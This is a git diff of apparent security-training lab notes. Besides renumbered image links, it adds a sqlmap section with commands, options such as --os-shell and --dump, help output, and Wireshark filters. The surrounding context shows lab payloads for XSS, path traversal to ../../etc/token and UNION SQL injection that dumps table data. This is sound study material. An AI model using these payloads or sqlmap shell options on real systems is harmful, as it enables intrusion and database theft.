@@ -38,7 +38,7 @@ nmap -sV --script=banner 192.168.0.5
 
 ### Cross Site Scripting \(XSS\)
 
-![](../.gitbook/assets/image%20%28339%29.png)
+![](../.gitbook/assets/image%20%28341%29.png)
 
 ```text
 # URL / Question 4
@@ -51,9 +51,9 @@ http://10.102.10.178/purchase?id=%3Cscript%3Econsole.log(%22R3fLect3d!%22);%3C/s
 * Globi hat Foto mit Boarding-Pass Code auf Instagram gestellt
 * Analysieren
 
-![](../.gitbook/assets/image%20%28332%29.png)
+![](../.gitbook/assets/image%20%28333%29.png)
 
-![](../.gitbook/assets/image%20%28326%29.png)
+![](../.gitbook/assets/image%20%28327%29.png)
 
 ```text
 M1MURPHY/DADE         REF NCRH2A LDNNYCIML6060 117Y034C2650 100
@@ -67,7 +67,7 @@ SSI LDN-NYC VEGETARIAN    OSI 30KG, ECONOMY
 
 * Dateien / Bilder auf Metadaten und Inhalt untersuchen
 
-![](../.gitbook/assets/image%20%28338%29.png)
+![](../.gitbook/assets/image%20%28339%29.png)
 
 ### Timestomp
 
@@ -81,9 +81,9 @@ Attackers need to hide their tracks and any prints that they may leave during an
 
 
 
-![](../.gitbook/assets/image%20%28324%29.png)
+![](../.gitbook/assets/image%20%28325%29.png)
 
-![](../.gitbook/assets/image%20%28329%29.png)
+![](../.gitbook/assets/image%20%28330%29.png)
 
 ### Hydra Brute Force
 
@@ -210,7 +210,7 @@ pa55w0rd!
 
 ```
 
-![](../.gitbook/assets/image%20%28341%29.png)
+![](../.gitbook/assets/image%20%28343%29.png)
 
 ```text
 root@john:~# john -help
@@ -325,7 +325,7 @@ nmap -sV -v -p- [IP Address]
 
 #### Question 1-2
 
-![](../.gitbook/assets/image%20%28334%29.png)
+![](../.gitbook/assets/image%20%28335%29.png)
 
 ```text
 root@iml-kali:~# nmap 10.102.3.47 --top-ports 1000
@@ -444,7 +444,7 @@ Nmap done: 1 IP address (1 host up) scanned in 157.72 seconds
 
 #### Question 4-5
 
-![](../.gitbook/assets/image%20%28335%29.png)
+![](../.gitbook/assets/image%20%28336%29.png)
 
 ```bash
 root@iml-kali:~# nmap -help
@@ -569,7 +569,7 @@ SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
 
 #### n 6-8
 
-![](../.gitbook/assets/image%20%28327%29.png)
+![](../.gitbook/assets/image%20%28328%29.png)
 
 ```bash
 root@iml-kali:~# nmap -sV -v -p 103 --script=banner 10.102.3.47
@@ -649,9 +649,9 @@ authority  = user@example.com:443
 http://<target-ip>/view/?photo=../../etc/token
 ```
 
-![](../.gitbook/assets/image%20%28331%29.png)
+![](../.gitbook/assets/image%20%28332%29.png)
 
-![](../.gitbook/assets/image%20%28328%29.png)
+![](../.gitbook/assets/image%20%28329%29.png)
 
 ### SQL-Injection
 
@@ -680,9 +680,9 @@ input' UNION SELECT 1,group_concat(column_name, 0x0a),3,4,5 FROM information_sch
 
 #### Übungen
 
-![](../.gitbook/assets/image%20%28337%29.png)
+![](../.gitbook/assets/image%20%28338%29.png)
 
-![](../.gitbook/assets/image%20%28330%29.png)
+![](../.gitbook/assets/image%20%28331%29.png)
 
 ```sql
 
@@ -727,4 +727,152 @@ input' UNION SELECT 1,2,group_concat(contact, currency, balanceowed) FROM Privat
 1 2 Jeremy RayYuan Renminbi$5.24
 
 ```
+
+### sqlmap
+
+* **Quick Summary**
+
+  **sqlmap** is a tool used to automate the detection and exploitation of SQL injection flaws, enabling users to carry out tasks such as dumping a database, accessing the underlying file system and executing commands. This lab introduces some of the features of **sqlmap** and explains how this tool can be used to reveal information.  
+
+```sql
+sqlmap -u 'http://www.somewebsite.com/select.php?id=123'
+
+--dbs option can be used to list all databases
+--tables and --columns.
+To reveal information stored in a particular table or column, the -T or -C options can be set to the appropriate name. The --dump option can be used to return all of the information.
+
+--sql-shell 
+--os-shell 
+
+
+sqlmap -h 
+```
+
+```bash
+root@iml-kali:~# sqlmap -h
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.3.11#stable}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+Usage: python3 sqlmap [options]
+
+Options:
+  -h, --help            Show basic help message and exit
+  -hh                   Show advanced help message and exit
+  --version             Show program's version number and exit
+  -v VERBOSE            Verbosity level: 0-6 (default 1)
+
+  Target:
+    At least one of these options has to be provided to define the
+    target(s)
+
+    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
+    -g GOOGLEDORK       Process Google dork results as target URLs
+
+  Request:
+    These options can be used to specify how to connect to the target URL
+
+    --data=DATA         Data string to be sent through POST (e.g. "id=1")
+    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
+    --random-agent      Use randomly selected HTTP User-Agent header value
+    --proxy=PROXY       Use a proxy to connect to the target URL
+    --tor               Use Tor anonymity network
+    --check-tor         Check to see if Tor is used properly
+
+  Injection:
+    These options can be used to specify which parameters to test for,
+    provide custom injection payloads and optional tampering scripts
+
+    -p TESTPARAMETER    Testable parameter(s)
+    --dbms=DBMS         Force back-end DBMS to provided value
+
+  Detection:
+    These options can be used to customize the detection phase
+
+    --level=LEVEL       Level of tests to perform (1-5, default 1)
+    --risk=RISK         Risk of tests to perform (1-3, default 1)
+
+  Techniques:
+    These options can be used to tweak testing of specific SQL injection
+    techniques
+
+    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
+
+  Enumeration:
+    These options can be used to enumerate the back-end database
+    management system information, structure and data contained in the
+    tables. Moreover you can run your own SQL statements
+
+    -a, --all           Retrieve everything
+    -b, --banner        Retrieve DBMS banner
+    --current-user      Retrieve DBMS current user
+    --current-db        Retrieve DBMS current database
+    --passwords         Enumerate DBMS users password hashes
+    --tables            Enumerate DBMS database tables
+    --columns           Enumerate DBMS database table columns
+    --schema            Enumerate DBMS schema
+    --dump              Dump DBMS database table entries
+    --dump-all          Dump all DBMS databases tables entries
+    -D DB               DBMS database to enumerate
+    -T TBL              DBMS database table(s) to enumerate
+    -C COL              DBMS database table column(s) to enumerate
+
+  Operating system access:
+    These options can be used to access the back-end database management
+    system underlying operating system
+
+    --os-shell          Prompt for an interactive operating system shell
+    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
+
+  General:
+    These options can be used to set some general working parameters
+
+    --batch             Never ask for user input, use the default behavior
+    --flush-session     Flush session files for current target
+
+  Miscellaneous:
+    These options do not fit into any other category
+
+    --sqlmap-shell      Prompt for an interactive sqlmap shell
+    --wizard            Simple wizard interface for beginner users
+
+[!] to see full list of options run with '-hh'
+[12:58:21] [WARNING] you haven't updated sqlmap for more than 433 days!!!
+
+```
+
+
+
+#### Übung
+
+```sql
+# Target via Browser ausfindig gemacht
+# http://10.102.10.181/?username=&password= 
+```
+
+
+
+### Packet Capture Basics
+
+* **Quick Summary**
+
+  To develop security analyst skills, you’ll need to interpret results from captured network packets. Capturing network packets can be done using command line tools \(tcpdump, tshark\) as well as popular GUI tools \(notably Wireshark\).  
+
+![](../.gitbook/assets/image%20%28340%29.png)
+
+```sql
+ip.addr == 172.21.2.116
+
+
+http contains google.com
+```
+
+![](../.gitbook/assets/image%20%28346%29.png)
+
+![](../.gitbook/assets/image%20%28345%29.png)
+
+![](../.gitbook/assets/image%20%28323%29.png)
 
